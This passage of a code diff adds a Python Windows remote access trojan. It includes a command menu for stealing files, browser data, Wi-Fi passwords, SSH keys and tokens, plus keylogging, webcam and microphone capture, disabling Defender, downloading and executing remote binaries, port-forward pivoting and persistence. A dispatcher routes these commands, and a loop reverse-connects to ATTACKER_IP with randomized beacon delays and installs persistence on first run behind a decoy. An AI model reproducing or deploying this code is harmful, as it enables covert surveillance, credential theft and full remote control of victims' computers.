+            t.sleep(0.05)
+    threading.Thread(target=_shake, daemon=True).start()
+    return f"[+] Crazy cursor active for {seconds}s"
+
+def open_cd() -> str:
+    """Open CD/DVD tray."""
+    try:
+        ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
+        return "[+] CD tray opened"
+    except Exception as e:
+        return f"[-] Error: {e}"
+
+def close_cd() -> str:
+    """Close CD/DVD tray."""
+    try:
+        ctypes.windll.winmm.mciSendStringW("set cdaudio door closed", None, 0, None)
+        return "[+] CD tray closed"
+    except Exception as e:
+        return f"[-] Error: {e}"
+
+def wallpaper_url(url: str) -> str:
+    """Download image from URL and set as wallpaper."""
+    try:
+        dest = os.path.join(TEMP, "wp_" + os.path.basename(url)[:30])
+        urllib.request.urlretrieve(url, dest)
+        ctypes.windll.user32.SystemParametersInfoW(20, 0, dest, 3)
+        return "[+] Wallpaper changed from URL"
+    except Exception as e:
+        return f"[-] Error: {e}"
+
+# ===================== PORT FORWARDING =====================
+
+_port_fwd_threads = {}
+
+def start_port_forward(local_port: str, remote_host: str, remote_port: str) -> str:
+    """Simple TCP port forwarder through victim."""
+    key = f"{local_port}"
+    if key in _port_fwd_threads:
+        return f"[-] Port {local_port} already forwarding"
+    _stop = threading.Event()
+
+    def _forward_conn(client_sock):
+        try:
+            remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            remote.settimeout(10)
+            remote.connect((remote_host, int(remote_port)))
+            remote.settimeout(None)
+
+            def relay(src, dst):
+                try:
+                    while not _stop.is_set():
+                        data = src.recv(4096)
+                        if not data:
+                            break
+                        dst.sendall(data)
+                except:
+                    pass
+                finally:
+                    try:
+                        src.close()
+                    except:
+                        pass
+                    try:
+                        dst.close()
+                    except:
+                        pass
+
+            t1 = threading.Thread(target=relay, args=(client_sock, remote), daemon=True)
+            t2 = threading.Thread(target=relay, args=(remote, client_sock), daemon=True)
+            t1.start()
+            t2.start()
+        except Exception:
+            try:
+                client_sock.close()
+            except:
+                pass
+
+    def _listener():
+        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        srv.settimeout(1)
+        try:
+            srv.bind(('0.0.0.0', int(local_port)))
+            srv.listen(5)
+            while not _stop.is_set():
+                try:
+                    conn, _ = srv.accept()
+                    threading.Thread(target=_forward_conn, args=(conn,), daemon=True).start()
+                except socket.timeout:
+                    continue
+        except Exception:
+            pass
+        finally:
+            srv.close()
+
+    t = threading.Thread(target=_listener, daemon=True)
+    t.start()
+    _port_fwd_threads[key] = (_stop, t)
+    return f"[+] Port forward: 0.0.0.0:{local_port} → {remote_host}:{remote_port}"
+
+def stop_port_forward(local_port: str = "") -> str:
+    """Stop one or all port forwards."""
+    if local_port and local_port in _port_fwd_threads:
+        _port_fwd_threads[local_port][0].set()
+        del _port_fwd_threads[local_port]
+        return f"[+] Port forward on port {local_port} stopped"
+    elif not local_port and _port_fwd_threads:
+        for k in list(_port_fwd_threads.keys()):
+            _port_fwd_threads[k][0].set()
+            del _port_fwd_threads[k]
+        return "[+] All port forwards stopped"
+    return "[-] No active port forwards"
+
+def list_port_forwards() -> str:
+    """List active port forwards."""
+    if not _port_fwd_threads:
+        return "[-] No active port forwards"
+    lines = ["[+] Active port forwards:"]
+    for k in _port_fwd_threads:
+        lines.append(f"  - Local port: {k}")
+    return "\n".join(lines)
+
+# ===================== HELP =====================
+
+HELP_TEXT = """
+═══════════════════════════════════════════════════════════════
+  AVAILABLE COMMANDS  v3.5
+═══════════════════════════════════════════════════════════════
+
+  NAVIGATION & FILES:
+    cd <dir>                  Change directory
+    pwd / ls [dir]            Print working directory / List
+    tree [dir] [depth]        Directory tree (depth default 3)
+    download <file>           Download file
+    download_dir <dir>        Compress and download directory
+    upload <file>             Upload file
+    cat <file>                Read file content
+    head <file> [n]           First N lines (def: 20)
+    tail <file> [n]           Last N lines (def: 20)
+    search <pattern>          Search files by name on C:\\
+    grep <text> [path]        Search text inside files
+    file_info <path>          Detailed info + MD5/SHA256 hashes
+    touch <file>              Create/update file timestamp
+    mkdir <dir>               Create directory
+    rmdir <path>              Remove file or directory
+    mv <src> <dst>            Move/rename
+    cp <src> <dst>            Copy file or directory
+    write <file> <content>    Write content to file (overwrites)
+    append <file> <content>   Append line to file
+    chattr <file> [timestamp] Change file date (YYYY-MM-DD HH:MM:SS)
+
+  COLLECTION (return a file):
+    steal                     Steal Desktop/Downloads/Docs/Pictures/Videos
+    sysinfo                   Full system info (tar)
+    screenshot                Instant screenshot
+    browsers                  Steal browser data
+    exfil                     TOTAL exfiltration
+    record_screen <sec>       Record screen X seconds (ZIP)
+    record_mic <sec>          Record microphone X seconds (WAV)
+    webcam_snap               Webcam photo (JPG)
+    scrloop <start [s]|stop|dump|clear>   Periodic screenshot
+
+  CREDENTIALS & SECRETS:
+    wifi                      Saved WiFi passwords
+    credvault                 Dump Windows Credential Manager
+    find_secrets              Search SSH keys, .env, VPN, KeePass, etc.
+    ssh_keys                  List and show SSH keys
+    token_steal               Tokens, sessions, stored credentials
+
+  INFORMATION & RECON:
+    status                    Basic info (user, host, IP, admin, uptime)
+    quick_info                Full quick info (WAN IP, Defender, OS)
+    geolocate                 Approximate geolocation by IP
+    proc_list                 Active processes (table)
+    software                  Installed software
+    net_scan [subnet]         Ping sweep of LAN
+    port_scan <ip> [ports]    Port scan (e.g., 80,443 or 1-1024)
+    dns_lookup <domain>       DNS resolution + MX
+    traceroute <host>         Trace route
+    arp_table                 ARP table
+    list_wifi                 Nearby WiFi networks
+    active_conn               Active TCP connections + listening ports
+    netstat                   Full netstat
+    privesc                   Privilege escalation vectors
+    getenv [var]              Environment variables
+    disk_info                 Disk/partition info
+    uptime                    System uptime
+    screen_res                Screen resolution
+    idle_time                 User idle time
+    timezone                  System timezone
+    recent_files              Recently opened files
+    drivers                   Installed drivers
+    startup_list              Startup programs and tasks
+    shares                    Shared resources (net share)
+    whoami                    whoami /all full
+    hostname                  Hostname + FQDN
+
+  USERS & SYSTEM:
+    net_user [user]           User info (or list all)
+    net_group [group]         Local group info (or list all)
+    reg_query <path>          Query Windows registry
+
+  APP CONTROL:
+    kill_app <name>           Kill process by name (e.g., chrome)
+    open_app <path/name>      Open application in background
+    hide_app <name>           Hide window
+    show_app <name>           Restore hidden window
+
+  DISRUPTION & TROLLING:
+    lock_screen               Lock desktop
+    change_wallpaper <path>   Change wallpaper
+    wallpaper_url <url>       Download image and set as wallpaper
+    alert <msg>               Simple popup alert
+    msgbox <title>|<text>     Popup with custom title
+    play_sound                Emit beep
+    set_volume <0-100>        Adjust volume
+    tts <text>                Text to speech (speak through speakers)
+    type_text <text>          Simulate keyboard typing
+    open_url <url>            Open URL in browser
+    swap_mouse                Swap mouse buttons
+    restore_mouse             Restore mouse buttons
+    hide_taskbar              Hide taskbar
+    show_taskbar              Restore taskbar
+    crazy_cursor [sec]        Move cursor randomly (def: 10s)
+    open_cd / close_cd        Open/close CD tray
+
+  CLIPBOARD:
+    clipboard                 Read clipboard
+    clip_set <text>           Write to clipboard
+    clip_monitor <cmd>        Monitor clipboard (start|stop|dump|clear)
+    wipe_clipboard            Erase clipboard
+    hosts_edit <dom> <ip>     Edit hosts for DNS spoofing
+
+  POWER CONTROL:
+    battery / reboot / shutdown / logoff
+
+  DOWNLOADS:
+    download_url <url>        Download file from internet to victim
+    exec_remote <url>         Download and execute binary from internet
+
+  PORT FORWARDING:
+    port_fwd <lport> <rhost> <rport>   Pivot TCP traffic
+    port_fwd_stop [lport]              Stop forwarding
+    port_fwd_list                      List active forwards
+
+  PERSISTENCE:
+    persist [all|registry|task|startup]   Install
+    persist check / toggle / remove
+
+  KEYLOGGER:
+    keylog start|stop|dump|clear
+
+  CLEANUP & EXIT:
+    autodestroy               Delete EVERYTHING
+    cleanup                   Clean temporary files
+    ps <cmd>                  Execute PowerShell
+    exit / kill_shell
+    <any command>             Execute in cmd
+
+═══════════════════════════════════════════════════════════════
+"""
+
+# ===================== MAIN DISPATCH =====================
+# Commands that generate a file (status_msg + FILE_START/data/FILE_END)
+FILE_COMMANDS = {"steal", "sysinfo", "screenshot", "browsers", "exfil", "record_screen"}
+
+def handle_command(sock: socket.socket, cmd: str) -> bool:
+    """Process command and send response. Returns False to break connection."""
+    if cmd == "exit":
+        return False
+    elif cmd == "kill_shell":
+        sock.close()
+        sys.exit(0)
+    elif cmd == "help":
+        send_encrypted(sock, HELP_TEXT)
+
+    # --- Navigation ---
+    elif cmd == "pwd":
+        send_encrypted(sock, os.getcwd())
+    elif cmd.startswith("cd "):
+        try:
+            os.chdir(cmd[3:].strip())
+            send_encrypted(sock, f"[+] {os.getcwd()}")
+        except Exception as e:
+            send_encrypted(sock, f"[-] {e}")
+    elif cmd == "ls":
+        send_encrypted(sock, list_directory())
+    elif cmd.startswith("ls "):
+        send_encrypted(sock, list_directory(cmd[3:].strip()))
+
+    # --- Files ---
+    elif cmd.startswith("download "):
+        fname = cmd[9:].strip()
+        if not os.path.exists(fname):
+            send_encrypted(sock, f"[-] Does not exist: {fname}")
+        else:
+            try:
+                send_encrypted(sock, "FILE_START")
+                with open(fname, 'rb') as f:
+                    while True:
+                        chunk = f.read(3 * 1024)
+                        if not chunk:
+                            break
+                        send_encrypted(sock, base64.b64encode(chunk).decode('ascii'))
+                send_encrypted(sock, "FILE_END")
+            except Exception:
+                send_encrypted(sock, "FILE_END")
+    elif cmd.startswith("upload "):
+        fname = cmd[7:].strip()
+        send_encrypted(sock, "READY_FOR_UPLOAD")
+        try:
+            with open(fname, 'wb') as f:
+                while True:
+                    line = recv_encrypted(sock)
+                    if line is None or line == "FILE_END":
+                        break
+                    f.write(base64.b64decode(line))
+            send_encrypted(sock, f"[+] {fname} saved ({os.path.getsize(fname)} bytes)")
+        except Exception as e:
+            send_encrypted(sock, f"[-] Error: {e}")
+
+    # --- Collection (with file) ---
+    elif cmd == "steal":
+        result = steal_files()
+        if os.path.exists(str(result)):
+            send_encrypted(sock, "[+] Collecting user files...")
+            send_file_over_socket(sock, result)
+            safe_remove(result)
+        else:
+            send_encrypted(sock, str(result))
+    elif cmd == "sysinfo":
+        result = gather_sysinfo()
+        if os.path.exists(str(result)):
+            send_encrypted(sock, "[+] Gathering system information...")
+            send_file_over_socket(sock, result)
+            safe_remove(result)
+        else:
+            send_encrypted(sock, str(result))
+    elif cmd == "screenshot":
+        result = take_screenshot()
+        if os.path.exists(str(result)):
+            send_encrypted(sock, "[+] Capturing screen...")
+            send_file_over_socket(sock, result)
+            safe_remove(result)
+        else:
+            send_encrypted(sock, str(result))
+    elif cmd == "browsers":
+        result = steal_browsers()
+        if os.path.exists(str(result)):
+            send_encrypted(sock, "[+] Extracting browser data...")
+            send_file_over_socket(sock, result)
+            safe_remove(result)
+        else:
+            send_encrypted(sock, str(result))
+    elif cmd == "exfil":
+        result = full_exfil()
+        if os.path.exists(str(result)):
+            send_encrypted(sock, "[+] TOTAL exfiltration complete, sending...")
+            send_file_over_socket(sock, result)
+            safe_remove(result)
+        else:
+            send_encrypted(sock, str(result))
+    elif cmd.startswith("record_screen "):
+        result = record_screen(cmd.split(" ", 1)[1])
+        if os.path.exists(str(result)):
+            send_encrypted(sock, "[+] Screen recording complete, sending ZIP...")
+            send_file_over_socket(sock, result)
+            safe_remove(result)
+        else:
+            send_encrypted(sock, str(result))
+
+    # --- Info (text) ---
+    elif cmd == "status":
+        send_encrypted(sock, get_system_status())
+    elif cmd == "quick_info":
+        send_encrypted(sock, quick_info())
+    elif cmd == "geolocate":
+        send_encrypted(sock, geolocate())
+    elif cmd == "wifi":
+        send_encrypted(sock, get_wifi_passwords())
+    elif cmd == "list_wifi":
+        send_encrypted(sock, list_wifi())
+    elif cmd == "clipboard":
+        send_encrypted(sock, get_clipboard())
+    elif cmd.startswith("clip_monitor "):
+        send_encrypted(sock, clipmon_control(cmd.split(" ", 1)[1].strip()))
+    elif cmd == "software":
+        send_encrypted(sock, get_installed_software())
+    elif cmd == "privesc":
+        send_encrypted(sock, check_privesc())
+
+    # --- Persistence ---
+    elif cmd == "persist check":
+        send_encrypted(sock, check_persistence())
+    elif cmd == "persist remove":
+        send_encrypted(sock, remove_persistence())
+    elif cmd == "persist toggle":
+        send_encrypted(sock, toggle_persistence())
+    elif cmd.startswith("persist"):
+        parts = cmd.split()
+        method = parts[1] if len(parts) > 1 else "all"
+        send_encrypted(sock, install_persistence(method))
+
+    # --- Keylogger ---
+    elif cmd.startswith("keylog "):
+        send_encrypted(sock, keylog_control(cmd[7:].strip()))
+    elif cmd == "keylog":
+        send_encrypted(sock, "[-] Usage: keylog start|stop|dump|clear")
+
+    # --- Admin (also accessible here, with internal check) ---
+    elif cmd == "disable_defender":
+        send_encrypted(sock, disable_defender())
+    elif cmd == "dump_hashes":
+        send_encrypted(sock, dump_hashes())
+
+    # --- Power & Hardware ---
+    elif cmd == "play_sound":
+        send_encrypted(sock, play_sound())
+    elif cmd.startswith("set_volume "):
+        send_encrypted(sock, set_volume(cmd.split(" ", 1)[1].strip()))
+    elif cmd == "battery":
+        send_encrypted(sock, get_battery())
+    elif cmd == "reboot":
+        send_encrypted(sock, run_cmd("shutdown /r /f /t 0"))
+    elif cmd == "shutdown":
+        send_encrypted(sock, run_cmd("shutdown /s /f /t 0"))
+    elif cmd == "logoff":
+        send_encrypted(sock, logoff_user())
+
+    # --- App Control ---
+    elif cmd.startswith("kill_app "):
+        send_encrypted(sock, kill_app(cmd[9:].strip()))
+    elif cmd.startswith("open_app "):
+        send_encrypted(sock, open_app(cmd[9:].strip()))
+    elif cmd.startswith("hide_app "):
+        send_encrypted(sock, hide_app(cmd[9:].strip()))
+    elif cmd.startswith("show_app "):
+        send_encrypted(sock, show_app(cmd[9:].strip()))
+
+    # --- Disruption ---
+    elif cmd == "lock_screen":
+        send_encrypted(sock, lock_screen())
+    elif cmd.startswith("change_wallpaper "):
+        send_encrypted(sock, change_wallpaper(cmd[17:].strip()))
+
+    # --- Recording / Espionage ---
+    elif cmd.startswith("record_mic "):
+        result = record_mic(cmd[11:].strip())
+        if os.path.exists(str(result)):
+            send_encrypted(sock, "[+] Recording complete, sending WAV...")
+            send_file_over_socket(sock, result)
+            safe_remove(result)
+        else:
+            send_encrypted(sock, str(result))
+    elif cmd == "webcam_snap":
+        result = webcam_snap()
+        if os.path.exists(str(result)):
+            send_encrypted(sock, "[+] Webcam photo captured, sending...")
+            send_file_over_socket(sock, result)
+            safe_remove(result)
+        else:
+            send_encrypted(sock, str(result))
+
+    # --- Autodestroy ---
+    elif cmd == "autodestroy":
+        msg = autodestroy()
+        send_encrypted(sock, msg)
+        time.sleep(1)
+        sock.close()
+        sys.exit(0)
+
+    # --- Utilities ---
+    elif cmd.startswith("alert "):
+        send_encrypted(sock, show_alert(cmd[6:].strip()))
+    elif cmd.startswith("kill "):
+        send_encrypted(sock, run_cmd(f"taskkill /IM {cmd[5:].strip()} /F"))
+    elif cmd == "cleanup":
+        send_encrypted(sock, cleanup())
+    elif cmd.startswith("ps "):
+        send_encrypted(sock, run_ps(cmd[3:].strip()))
+
+    # --- Search & Files ---
+    elif cmd.startswith("search "):
+        send_encrypted(sock, search_files(cmd[7:].strip()))
+    elif cmd.startswith("cat "):
+        send_encrypted(sock, cat_file(cmd[4:].strip()))
+    elif cmd.startswith("download_dir "):
+        result = download_dir(cmd[13:].strip())
+        if os.path.exists(str(result)):
+            send_encrypted(sock, "[+] Directory compressed, sending ZIP...")
+            send_file_over_socket(sock, result)
+            safe_remove(result)
+        else:
+            send_encrypted(sock, str(result))
+
+    # --- Credentials & Secrets ---
+    elif cmd == "credvault":
+        send_encrypted(sock, dump_credvault())
+    elif cmd == "find_secrets":
+        send_encrypted(sock, find_secrets())
+    elif cmd == "ssh_keys":
+        send_encrypted(sock, ssh_keys())
+    elif cmd == "token_steal":
+        send_encrypted(sock, token_steal())
+
+    # --- Network Recon ---
+    elif cmd.startswith("net_scan"):
+        subnet = cmd[8:].strip() if len(cmd) > 8 else ""
+        send_encrypted(sock, net_scan(subnet))
+    elif cmd.startswith("port_scan "):
+        parts = cmd[10:].strip().split(None, 1)
+        target = parts[0] if parts else ""
+        ports = parts[1] if len(parts) > 1 else ""
+        send_encrypted(sock, port_scan(target, ports))
+    elif cmd.startswith("dns_lookup "):
+        send_encrypted(sock, dns_lookup(cmd[11:].strip()))
+    elif cmd.startswith("traceroute "):
+        send_encrypted(sock, traceroute(cmd[11:].strip()))
+    elif cmd == "arp_table":
+        send_encrypted(sock, arp_table())
+    elif cmd == "active_conn":
+        send_encrypted(sock, active_connections())
+    elif cmd == "netstat":
+        send_encrypted(sock, netstat())
+    elif cmd.startswith("hosts_edit "):
+        parts = cmd[11:].strip().split(None, 1)
+        if len(parts) == 2:
+            send_encrypted(sock, hosts_edit(parts[0], parts[1]))
+        else:
+            send_encrypted(sock, "[-] Usage: hosts_edit <domain> <ip>")
+
+    # --- Processes & Env ---
+    elif cmd == "proc_list":
+        send_encrypted(sock, proc_list())
+    elif cmd.startswith("getenv"):
+        send_encrypted(sock, getenv(cmd[6:].strip()))
+
+    # --- Extended Clipboard ---
+    elif cmd.startswith("clip_set "):
+        send_encrypted(sock, clip_set(cmd[9:].strip()))
+    elif cmd == "wipe_clipboard":
+        send_encrypted(sock, wipe_clipboard())
+
+    # --- Screenshot Loop ---
+    elif cmd.startswith("scrloop "):
+        parts = cmd[8:].strip().split(None, 1)
+        action = parts[0] if parts else ""
+        interval = parts[1] if len(parts) > 1 else "5"
+        if action == "dump":
+            result = scrloop_control("dump")
+            if os.path.exists(str(result)):
+                send_encrypted(sock, f"[+] Sending {os.path.basename(result)}...")
+                send_file_over_socket(sock, result)
+                safe_remove(result)
+            else:
+                send_encrypted(sock, str(result))
+        else:
+            send_encrypted(sock, scrloop_control(action, interval))
+
+    # --- New v3.0 Commands ---
+    elif cmd == "disk_info":
+        send_encrypted(sock, disk_info())
+    elif cmd == "uptime":
+        send_encrypted(sock, get_uptime())
+    elif cmd.startswith("open_url "):
+        send_encrypted(sock, open_url(cmd[9:].strip()))
+    elif cmd.startswith("type_text "):
+        send_encrypted(sock, type_text(cmd[10:].strip()))
+    elif cmd.startswith("msgbox "):
+        parts = cmd[7:].strip().split('|', 1)
+        if len(parts) == 2:
+            send_encrypted(sock, msgbox(parts[0].strip(), parts[1].strip()))
+        else:
+            send_encrypted(sock, msgbox("System", parts[0].strip()))
+    elif cmd.startswith("tts "):
+        send_encrypted(sock, tts_speak(cmd[4:].strip()))
+    elif cmd == "startup_list":
+        send_encrypted(sock, startup_list())
+    elif cmd == "shares":
+        send_encrypted(sock, list_shares())
+    elif cmd == "token_steal":
+        send_encrypted(sock, token_steal())
+    elif cmd.startswith("download_url "):
+        parts = cmd[13:].strip().split(None, 1)
+        url = parts[0] if parts else ""
+        dest = parts[1] if len(parts) > 1 else ""
+        send_encrypted(sock, download_url(url, dest))
+    elif cmd.startswith("exec_remote "):
+        send_encrypted(sock, exec_remote(cmd[12:].strip()))
+    elif cmd.startswith("file_info "):
+        send_encrypted(sock, file_info(cmd[10:].strip()))
+    elif cmd.startswith("touch "):
+        send_encrypted(sock, touch_file(cmd[6:].strip()))
+    elif cmd.startswith("mkdir "):
+        send_encrypted(sock, make_dir(cmd[6:].strip()))
+    elif cmd.startswith("rmdir "):
+        send_encrypted(sock, remove_dir(cmd[6:].strip()))
+    elif cmd.startswith("mv "):
+        parts = cmd[3:].strip().split(None, 1)
+        if len(parts) == 2:
+            send_encrypted(sock, move_file(parts[0], parts[1]))
+        else:
+            send_encrypted(sock, "[-] Usage: mv <source> <destination>")
+    elif cmd.startswith("cp "):
+        parts = cmd[3:].strip().split(None, 1)
+        if len(parts) == 2:
+            send_encrypted(sock, copy_file(parts[0], parts[1]))
+        else:
+            send_encrypted(sock, "[-] Usage: cp <source> <destination>")
+    elif cmd == "whoami":
+        send_encrypted(sock, whoami())
+    elif cmd == "hostname":
+        send_encrypted(sock, hostname())
+    elif cmd == "screen_res":
+        send_encrypted(sock, screen_res())
+    elif cmd == "idle_time":
+        send_encrypted(sock, idle_time())
+    elif cmd == "timezone":
+        send_encrypted(sock, get_timezone())
+    elif cmd == "recent_files":
+        send_encrypted(sock, recent_files())
+    elif cmd == "drivers":
+        send_encrypted(sock, list_drivers())
+    elif cmd.startswith("grep "):
+        parts = cmd[5:].strip().split(None, 1)
+        pattern = parts[0] if parts else ""
+        path = parts[1] if len(parts) > 1 else "."
+        send_encrypted(sock, grep_files(pattern, path))
+    elif cmd.startswith("reg_query "):
+        send_encrypted(sock, reg_query(cmd[10:].strip()))
+    elif cmd.startswith("net_user"):
+        send_encrypted(sock, net_user_detail(cmd[8:].strip()))
+    elif cmd.startswith("net_group"):
+        send_encrypted(sock, net_localgroup(cmd[9:].strip()))
+    elif cmd.startswith("tail "):
+        parts = cmd[5:].strip().split(None, 1)
+        path = parts[0] if parts else ""
+        n = parts[1] if len(parts) > 1 else "20"
+        send_encrypted(sock, tail_file(path, n))
+    elif cmd.startswith("head "):
+        parts = cmd[5:].strip().split(None, 1)
+        path = parts[0] if parts else ""
+        n = parts[1] if len(parts) > 1 else "20"
+        send_encrypted(sock, head_file(path, n))
+    elif cmd.startswith("write "):
+        parts = cmd[6:].strip().split(None, 1)
+        if len(parts) == 2:
+            send_encrypted(sock, write_file(parts[0], parts[1]))
+        else:
+            send_encrypted(sock, "[-] Usage: write <file> <content>")
+    elif cmd.startswith("append "):
+        parts = cmd[7:].strip().split(None, 1)
+        if len(parts) == 2:
+            send_encrypted(sock, append_file(parts[0], parts[1]))
+        else:
+            send_encrypted(sock, "[-] Usage: append <file> <content>")
+    elif cmd.startswith("tree"):
+        parts = cmd[4:].strip().split(None, 1)
+        path = parts[0] if parts else "."
+        depth = parts[1] if len(parts) > 1 else "3"
+        try:
+            depth = int(depth)
+        except:
+            depth = 3
+        send_encrypted(sock, tree_dir(path, depth))
+    elif cmd.startswith("chattr "):
+        parts = cmd[7:].strip().split(None, 1)
+        path = parts[0] if parts else ""
+        ts = parts[1] if len(parts) > 1 else ""
+        send_encrypted(sock, change_timestamp(path, ts))
+    elif cmd == "logoff":
+        send_encrypted(sock, logoff_user())
+
+    # --- Trolling Extras ---
+    elif cmd == "swap_mouse":
+        send_encrypted(sock, swap_mouse(True))
+    elif cmd == "restore_mouse":
+        send_encrypted(sock, swap_mouse(False))
+    elif cmd == "hide_taskbar":
+        send_encrypted(sock, hide_taskbar())
+    elif cmd == "show_taskbar":
+        send_encrypted(sock, show_taskbar())
+    elif cmd.startswith("crazy_cursor"):
+        parts = cmd.split()
+        secs = int(parts[1]) if len(parts) > 1 else 10
+        send_encrypted(sock, crazy_cursor(secs))
+    elif cmd == "open_cd":
+        send_encrypted(sock, open_cd())
+    elif cmd == "close_cd":
+        send_encrypted(sock, close_cd())
+    elif cmd.startswith("wallpaper_url "):
+        send_encrypted(sock, wallpaper_url(cmd[14:].strip()))
+
+    # --- Port Forwarding ---
+    elif cmd.startswith("port_fwd_stop"):
+        parts = cmd.split()
+        port = parts[1] if len(parts) > 1 else ""
+        send_encrypted(sock, stop_port_forward(port))
+    elif cmd == "port_fwd_list":
+        send_encrypted(sock, list_port_forwards())
+    elif cmd.startswith("port_fwd "):
+        parts = cmd[9:].strip().split()
+        if len(parts) == 3:
+            send_encrypted(sock, start_port_forward(parts[0], parts[1], parts[2]))
+        else:
+            send_encrypted(sock, "[-] Usage: port_fwd <lport> <rhost> <rport>")
+
+    # --- Generic Command ---
+    else:
+        send_encrypted(sock, run_cmd(cmd))
+
+    return True
+
+# ===================== CONNECTION LOOP =====================
+
+def connect_and_loop():
+    """Infinite loop that connects to the listener, processes commands, and reconnects on failure."""
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ATTACKER_IP, ATTACKER_PORT))
+            hostname = socket.gethostname()
+            user = getpass.getuser()
+            admin = "ADMIN" if is_admin() else "user"
+            vm_tag = ""
+            send_encrypted(s, f"[+] Connected: {user}@{hostname} ({admin}) in {os.getcwd()} [v3.5]{vm_tag}")
+
+            while True:
+                cmd = recv_encrypted(s)
+                if cmd is None:
+                    break
+                cmd = cmd.strip()
+                if not cmd:
+                    continue
+                if not handle_command(s, cmd):
+                    break
+        except (socket.error, ConnectionRefusedError, ConnectionResetError):
+            pass
+        except KeyboardInterrupt:
+            break
+        except Exception:
+            pass
+        finally:
+            try:
+                s.close()
+            except:
+                pass
+            if _persist_active and (not os.path.exists(PERSIST_SCRIPT) or os.path.realpath(__file__) != os.path.realpath(PERSIST_SCRIPT)):
+                install_persistence()
+        # Beacon jitter: randomized reconnect delay
+        if BEACON_JITTER:
+            delay = random.uniform(BEACON_MIN, BEACON_MAX)
+        else:
+            delay = RECONNECT_DELAY
+        time.sleep(delay)
+
+if __name__ == "__main__":
+    # Automatically install persistence on first run
+    if not os.path.exists(PERSIST_SCRIPT) or os.path.realpath(__file__) != os.path.realpath(PERSIST_SCRIPT):
+        install_persistence()
+        launch_decoy()
+    connect_and_loop()
